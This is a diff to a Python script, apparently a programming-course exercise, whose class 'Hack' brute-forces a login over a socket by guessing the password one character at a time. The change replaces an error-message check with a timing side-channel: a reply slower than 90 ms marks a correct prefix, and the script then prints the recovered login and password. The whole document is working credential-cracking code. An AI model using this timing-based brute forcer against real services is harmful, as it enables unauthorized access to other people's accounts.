@@ -4,6 +4,7 @@ import itertools
 import json
 import os
 import string
+import time
 
 
 class Hack:
@@ -34,10 +35,12 @@ class Hack:
                 password_cur += element
                 password_json = json.dumps({'login': self.login, 'password': password_cur})
                 self.my_socket.send(password_json.encode())
+                start = time.perf_counter()
                 password_response = self.my_socket.recv(1024)
+                end = time.perf_counter()
                 password_msg = json.loads(password_response.decode())
                 # print(password_msg)
-                if password_msg['result'] == 'Exception happened during login':
+                if (end - start) * 1000000 >= 90000:
                     self.password = password_cur
                     break
                 if password_msg['result'] == 'Connection success!':
@@ -50,4 +53,3 @@ hacker.hack_login()
 hacker.hack_password()
 result = json.dumps({"login": hacker.login, "password": hacker.password})
 print(result)
-
